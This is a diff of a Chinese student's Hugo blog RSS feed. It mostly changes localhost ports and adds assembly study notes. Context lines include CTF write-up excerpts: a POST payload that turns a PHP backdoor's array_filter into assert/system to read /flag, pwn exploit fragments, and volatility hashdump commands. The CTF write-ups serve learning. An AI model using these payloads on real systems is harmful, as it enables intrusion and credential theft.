@@ -2,19 +2,83 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on 萧垣的博客</title>
-        <link>http://localhost:4592/post/</link>
+        <link>http://localhost:8840/post/</link>
         <description>Recent content in Posts on 萧垣的博客</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <managingEditor>2024211570@bupt.cn (XiaoYuan)</managingEditor>
         <webMaster>2024211570@bupt.cn (XiaoYuan)</webMaster>
         <copyright>XiaoYuan</copyright>
-        <lastBuildDate>Sun, 19 Jan 2025 21:25:32 +0800</lastBuildDate><atom:link href="http://localhost:4592/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 27 Mar 2025 21:12:32 +0800</lastBuildDate><atom:link href="http://localhost:8840/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>程序的机器级表示 - 1</title>
+        <link>http://localhost:8840/p/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA-1/</link>
+        <pubDate>Thu, 27 Mar 2025 21:12:32 +0800</pubDate>
+        <author>2024211570@bupt.cn (XiaoYuan)</author>
+        <guid>http://localhost:8840/p/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA-1/</guid>
+        <description>&lt;h1 id=&#34;程序的机器级表示&#34;&gt;程序的机器级表示
+&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;编译器&lt;/code&gt; 基于&lt;strong&gt;编程语言的规则、操作系统的惯例、目标机器的指令集&lt;/strong&gt;生成机器代码。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;汇编代码&lt;/code&gt; 是机器代码的一种形式，它是机器代码的文本表示。&lt;/li&gt;
+&lt;li&gt;高级代码可移植性好，而&lt;strong&gt;汇编代码与特定机器密切相关&lt;/strong&gt;。
+&lt;em&gt;基于x86-64&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;32-程序编码&#34;&gt;3.2 程序编码
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ gcc -Og -o p p1.c p2.c
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;-Og: 生成符合原始C代码整体结构的机器代码的优化等级。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;Step1：&lt;em&gt;C预处理器&lt;/em&gt; 插入所有用&lt;code&gt;#include&lt;/code&gt;命令指定的文件，并拓展&lt;code&gt;#define&lt;/code&gt;指定的宏&lt;/li&gt;
+&lt;li&gt;Step2：&lt;em&gt;编译器&lt;/em&gt;产生两个源文件的汇编代码，分别为&lt;code&gt;p1.s&lt;/code&gt;和&lt;code&gt;p2.s&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;Step3：&lt;em&gt;汇编器&lt;/em&gt;将汇编代码转化成&lt;em&gt;二进制目标代码文件&lt;/em&gt;&lt;code&gt;p1.o&lt;/code&gt;和&lt;code&gt;p2.o&lt;/code&gt;，是机器代码的一种形式，它包含二进制形式表示的所有指令，但还没有填入全局值的地址。&lt;/li&gt;
+&lt;li&gt;Step4：&lt;em&gt;链接器&lt;/em&gt;将两个目标代码文件与实现库函数的代码合并，并产生最终的可执行代码文件&lt;code&gt;p&lt;/code&gt;（&lt;code&gt;-o&lt;/code&gt;后指定的文件名）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;321-机器级代码&#34;&gt;3.2.1 机器级代码
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;两种抽象模型：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;指令集架构/ISA&lt;/strong&gt;：定义了处理器状态、指令的格式、指令对状态的影响。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;虚拟地址&lt;/strong&gt;：机器代码将内存看成一个按字节寻址的数组。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;对机器代码可见的处理器状态：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;程序计数器/PC&lt;/strong&gt;：在x86-64中用&lt;code&gt;%rip&lt;/code&gt;表示，给出将要执行的下一条指令在内存中的地址。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;整数寄存器文件&lt;/strong&gt;：16个命名位置，存储64位值，存储地址或整数数据，保存临时数据或重要的程序状态。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;条件码寄存器&lt;/strong&gt;：保存最近执行的算术或逻辑指令的状态信息，如&lt;code&gt;if&lt;/code&gt;和&lt;code&gt;while&lt;/code&gt;语句。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;向量寄存器&lt;/strong&gt;：保存一个或多个整数或浮点数值。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;C 语言中的数组和结构，在机器代码中用一组连续的字节来表示。
+汇编代码不区分有符号数和无符号数，不区分指针的不同类型，不区分指针和整数。&lt;/p&gt;
+&lt;p&gt;一条机器指令只执行一个非常基本的操作。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;程序内存
+包含程序的可执行机器代码，操作系统需要的一些信息，栈和堆（用户分配的内存块）。&lt;/p&gt;
+&lt;p&gt;使用&lt;strong&gt;虚拟地址&lt;/strong&gt;来寻址，这些地址的&lt;em&gt;高16位必须设0&lt;/em&gt;，操作系统负责管理虚拟地址空间，将虚拟地址翻译成实际处理器内存中的物理地址&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
         <title>提问的智慧</title>
-        <link>http://localhost:4592/p/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/</link>
+        <link>http://localhost:8840/p/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/</link>
         <pubDate>Sun, 19 Jan 2025 21:25:32 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/</guid>
+        <guid>http://localhost:8840/p/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/</guid>
         <description>&lt;h1 id=&#34;前言&#34;&gt;前言
 &lt;/h1&gt;&lt;p&gt;本人 &lt;code&gt;ISFJ&lt;/code&gt;，非常乐意为大家解决问题，特别是一些技术问题。但是要知道，这种问题通常来说不是很好解决。但很遗憾的是，提问者通常不能提供解决问题所需的一些信息，以下是推荐所有人阅读的&lt;strong&gt;提问的智慧&lt;/strong&gt;以及我自己的一些建议。同时，在帮他人解决问题时我也会尽力遵循&lt;a class=&#34;link&#34; href=&#34;#%e5%a6%82%e4%bd%95%e6%9b%b4%e5%a5%bd%e5%9c%b0%e5%9b%9e%e7%ad%94%e9%97%ae%e9%a2%98&#34; &gt;如何更好地回答问题&lt;/a&gt;&lt;/p&gt;
 &lt;ol&gt;
@@ -459,19 +523,19 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
         </item>
         <item>
         <title>强网青少初赛WP</title>
-        <link>http://localhost:4592/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/</link>
+        <link>http://localhost:8840/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/</link>
         <pubDate>Wed, 27 Nov 2024 00:00:00 +0000</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/</guid>
-        <description>&lt;h1 id=&#34;misc&#34;&gt;Misc
-&lt;/h1&gt;&lt;h2 id=&#34;签到漫画&#34;&gt;签到漫画
-&lt;/h2&gt;&lt;p&gt;二维码拼图，扫码得到URL&lt;/p&gt;
+        <guid>http://localhost:8840/p/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E5%88%9D%E8%B5%9Bwp/</guid>
+        <description>&lt;h2 id=&#34;misc&#34;&gt;Misc
+&lt;/h2&gt;&lt;h3 id=&#34;签到漫画&#34;&gt;签到漫画
+&lt;/h3&gt;&lt;p&gt;二维码拼图，扫码得到URL&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag%7byouthful_and_upward%7d&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward}&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;whitepic&#34;&gt;whitepic
-&lt;/h2&gt;&lt;p&gt;后缀改为.gif 放入gif逐帧分析可得flag&lt;/p&gt;
-&lt;h2 id=&#34;删除后门用户2&#34;&gt;删除后门用户2
-&lt;/h2&gt;&lt;p&gt;题目内容：&lt;/p&gt;
+&lt;h3 id=&#34;whitepic&#34;&gt;whitepic
+&lt;/h3&gt;&lt;p&gt;后缀改为.gif 放入gif逐帧分析可得flag&lt;/p&gt;
+&lt;h3 id=&#34;删除后门用户2&#34;&gt;删除后门用户2
+&lt;/h3&gt;&lt;p&gt;题目内容：&lt;/p&gt;
 &lt;p&gt;本题需要选手完成风险排查：清理后门用户。当彻底清理好后，等待一分钟左右，/checklog会出现flag。&lt;/p&gt;
 &lt;p&gt;（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）&lt;/p&gt;
 &lt;p&gt;直接userdel显示进程占用&lt;/p&gt;
@@ -480,9 +544,9 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;p&gt;kill 57 58 61&lt;/p&gt;
 &lt;p&gt;userdel -f backdoor&lt;/p&gt;
 &lt;p&gt;过一分钟拿flag&lt;/p&gt;
-&lt;h1 id=&#34;pwn&#34;&gt;PWN
-&lt;/h1&gt;&lt;h2 id=&#34;clock_in&#34;&gt;clock_in
-&lt;/h2&gt;&lt;p&gt;题目内容：&lt;/p&gt;
+&lt;h2 id=&#34;pwn&#34;&gt;PWN
+&lt;/h2&gt;&lt;h3 id=&#34;clock_in&#34;&gt;clock_in
+&lt;/h3&gt;&lt;p&gt;题目内容：&lt;/p&gt;
 &lt;p&gt;1.We wish you success and hope you enjoy this task.&lt;/p&gt;
 &lt;p&gt;2.The flag position is in /home/ctf/flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -569,8 +633,8 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;journey_story&#34;&gt;journey_story
-&lt;/h2&gt;&lt;p&gt;题目内容：&lt;/p&gt;
+&lt;/div&gt;&lt;h3 id=&#34;journey_story&#34;&gt;journey_story
+&lt;/h3&gt;&lt;p&gt;题目内容：&lt;/p&gt;
 &lt;p&gt;Record your journey, leave your story.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -707,9 +771,9 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;interactive交互之后新建一个堆块，内容写/bin/sh回车，然后删除该堆块（本exp中堆块index应为5）&lt;/p&gt;
-&lt;h1 id=&#34;web&#34;&gt;WEB
-&lt;/h1&gt;&lt;h2 id=&#34;ezfindshell&#34;&gt;ezFindShell
-&lt;/h2&gt;&lt;p&gt;下载附件发现好多php代码，我们找找有没有可以利用的]
+&lt;h2 id=&#34;web&#34;&gt;WEB
+&lt;/h2&gt;&lt;h3 id=&#34;ezfindshell&#34;&gt;ezFindShell
+&lt;/h3&gt;&lt;p&gt;下载附件发现好多php代码，我们找找有没有可以利用的]
 &lt;code&gt;grep -r --include=&#39;*.php&#39; &#39;POST&#39; /path/to/your/directory&lt;/code&gt;
 找到了&lt;code&gt;1de9d9a55a824f4f8b6f37af76596baa.php&lt;/code&gt;
 注意&lt;code&gt;$e=$REQUEST[&#39;e&#39;];$arr=array($POST[&#39;POST&#39;],);array_filter($arr,base64_decode($e));&lt;/code&gt;
@@ -717,8 +781,8 @@ I&amp;rsquo;ll be glad to translate responses, if you only use one or the other.
 我们只要让回调函数变成&lt;code&gt;assert&lt;/code&gt;，arr数组传入的值为&lt;code&gt;system(&amp;quot;ls /&amp;quot;)&lt;/code&gt;就好
 POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&lt;/code&gt;
 看到flag，改下参数&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;cat /flag&amp;quot;)&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;cyberboard&#34;&gt;cyberboard
-&lt;/h2&gt;&lt;p&gt;上来给了个登录框,用户名和密码如下&lt;/p&gt;
+&lt;h3 id=&#34;cyberboard&#34;&gt;cyberboard
+&lt;/h3&gt;&lt;p&gt;上来给了个登录框,用户名和密码如下&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -801,10 +865,10 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
         </item>
         <item>
         <title>编码系列</title>
-        <link>http://localhost:4592/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</link>
+        <link>http://localhost:8840/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</link>
         <pubDate>Mon, 28 Oct 2024 15:43:08 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</guid>
+        <guid>http://localhost:8840/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/</guid>
         <description>&lt;h1 id=&#34;编码系列持续更新&#34;&gt;编码系列(持续更新)
 &lt;/h1&gt;&lt;h2 id=&#34;base家族&#34;&gt;Base家族
 &lt;/h2&gt;&lt;h3 id=&#34;base16&#34;&gt;Base16
@@ -1048,10 +1112,10 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
         </item>
         <item>
         <title>BuildCTF WP Misc部分</title>
-        <link>http://localhost:4592/p/buildctf-wp-misc%E9%83%A8%E5%88%86/</link>
+        <link>http://localhost:8840/p/buildctf-wp-misc%E9%83%A8%E5%88%86/</link>
         <pubDate>Thu, 24 Oct 2024 22:35:40 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/buildctf-wp-misc%E9%83%A8%E5%88%86/</guid>
+        <guid>http://localhost:8840/p/buildctf-wp-misc%E9%83%A8%E5%88%86/</guid>
         <description>&lt;h1 id=&#34;buildctf-wp-misc部分&#34;&gt;BuildCTF WP Misc部分
 &lt;/h1&gt;&lt;p&gt;&lt;em&gt;第一次和各位师傅把misc AK了，太强了，太有成就感了！感谢各位&lt;/em&gt;&lt;/p&gt;
 &lt;h2 id=&#34;what-is-this&#34;&gt;what is this?
@@ -1251,10 +1315,10 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
         </item>
         <item>
         <title>Intro</title>
-        <link>http://localhost:4592/p/intro/</link>
+        <link>http://localhost:8840/p/intro/</link>
         <pubDate>Sat, 19 Oct 2024 15:41:42 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/intro/</guid>
+        <guid>http://localhost:8840/p/intro/</guid>
         <description>&lt;h1 id=&#34;intro&#34;&gt;Intro
 &lt;/h1&gt;&lt;h2 id=&#34;what-is-machine-learning&#34;&gt;what is machine learning
 &lt;/h2&gt;&lt;ol&gt;
@@ -1319,10 +1383,10 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
         </item>
         <item>
         <title>NewStar 第一周 WP</title>
-        <link>http://localhost:4592/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/</link>
+        <link>http://localhost:8840/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/</link>
         <pubDate>Sat, 05 Oct 2024 14:45:13 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/</guid>
+        <guid>http://localhost:8840/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/</guid>
         <description>&lt;h1 id=&#34;newstar-第一周-wp&#34;&gt;NewStar 第一周 WP
 &lt;/h1&gt;&lt;h2 id=&#34;misc&#34;&gt;Misc
 &lt;/h2&gt;&lt;h3 id=&#34;decompress&#34;&gt;decompress
@@ -1424,10 +1488,10 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
         </item>
         <item>
         <title>Python基础知识</title>
-        <link>http://localhost:4592/p/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
+        <link>http://localhost:8840/p/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
         <pubDate>Mon, 30 Sep 2024 11:12:41 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
+        <guid>http://localhost:8840/p/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
         <description>&lt;h1 id=&#34;python基础知识&#34;&gt;Python基础知识
 &lt;/h1&gt;&lt;h2 id=&#34;学前提醒&#34;&gt;学前提醒
 &lt;/h2&gt;&lt;p&gt;&lt;strong&gt;一定记得要自己动手编程试试哦~&lt;/strong&gt;&lt;/p&gt;
@@ -1539,7 +1603,7 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;算术运算符&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:4592/%e8%bf%90%e7%ae%97%e7%ac%a6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:8840/%e8%bf%90%e7%ae%97%e7%ac%a6.png&#34;
 	
 	
 	
@@ -1553,7 +1617,7 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;关系运算符&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:4592/%e5%85%b3%e7%b3%bb%e8%bf%90%e7%ae%97%e7%ac%a6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:8840/%e5%85%b3%e7%b3%bb%e8%bf%90%e7%ae%97%e7%ac%a6.png&#34;
 	
 	
 	
@@ -1567,7 +1631,7 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;逻辑运算符&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:4592/%e9%80%bb%e8%be%91%e8%bf%90%e7%ae%97%e7%ac%a6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:8840/%e9%80%bb%e8%be%91%e8%bf%90%e7%ae%97%e7%ac%a6.png&#34;
 	
 	
 	
@@ -1587,7 +1651,7 @@ POST提交&lt;code&gt;e=YXNzZXJ0&amp;amp;POST=system(&amp;quot;ls /&amp;quot;)&l
 &lt;li&gt;字符串（关于转义字符可转到“关于格式化输出”）
 &lt;ul&gt;
 &lt;li&gt;索引：从零开始的标号
-&lt;img src=&#34;http://localhost:4592/%e7%b4%a2%e5%bc%95.png&#34;
+&lt;img src=&#34;http://localhost:8840/%e7%b4%a2%e5%bc%95.png&#34;
 	
 	
 	
@@ -1632,7 +1696,7 @@ ello
 &lt;/code&gt;&lt;/pre&gt;
 &lt;ul&gt;
 &lt;li&gt;速会切片：
-&lt;img src=&#34;http://localhost:4592/%e5%88%87%e7%89%87.png&#34;
+&lt;img src=&#34;http://localhost:8840/%e5%88%87%e7%89%87.png&#34;
 	
 	
 	
@@ -1823,7 +1887,7 @@ C 12
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;分支结构(if语句)：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:4592/%e5%88%86%e6%94%af%e7%bb%93%e6%9e%84.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:8840/%e5%88%86%e6%94%af%e7%bb%93%e6%9e%84.png&#34;
 	
 	
 	
@@ -1915,10 +1979,10 @@ C 12
         </item>
         <item>
         <title>TSCTF-J wp</title>
-        <link>http://localhost:4592/p/tsctf-j-wp/</link>
+        <link>http://localhost:8840/p/tsctf-j-wp/</link>
         <pubDate>Sat, 28 Sep 2024 11:12:41 +0800</pubDate>
         <author>2024211570@bupt.cn (XiaoYuan)</author>
-        <guid>http://localhost:4592/p/tsctf-j-wp/</guid>
+        <guid>http://localhost:8840/p/tsctf-j-wp/</guid>
         <description>&lt;h1 id=&#34;tsctf-j-xiaoyuan-writeup&#34;&gt;TSCTF-J XiaoYuan Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;misc&#34;&gt;MISC
 &lt;/h2&gt;&lt;hr&gt;
@@ -2335,7 +2399,7 @@ C 12
 &lt;h4 id=&#34;1&#34;&gt;1
 &lt;/h4&gt;&lt;p&gt;内存镜像是 &lt;code&gt;.elf&lt;/code&gt; 格式的，看了一下重新下了个volatility3，旧的不支持
 用 &lt;code&gt;vol.exe&lt;/code&gt; 查看镜像信息即得
-&lt;img src=&#34;http://localhost:4592/1.png&#34;
+&lt;img src=&#34;http://localhost:8840/1.png&#34;
 	
 	
 	
@@ -2349,7 +2413,7 @@ C 12
 &lt;/h4&gt;&lt;p&gt;用 &lt;code&gt;vol.exe -f dump.elf windows.hashdump&lt;/code&gt;得到了密码的hash，在线爆破得到密码提交flag&lt;/p&gt;
 &lt;h4 id=&#34;3&#34;&gt;3
 &lt;/h4&gt;&lt;p&gt;&lt;code&gt;vol.exe -f dump.elf windows.pslist&lt;/code&gt;查看进程
-&lt;img src=&#34;http://localhost:4592/3-1.png&#34;
+&lt;img src=&#34;http://localhost:8840/3-1.png&#34;
 	
 	
 	
@@ -2359,7 +2423,7 @@ C 12
 	
 	
 &gt;
-&lt;img src=&#34;http://localhost:4592/3-2.png&#34;
+&lt;img src=&#34;http://localhost:8840/3-2.png&#34;
 	
 	
 	
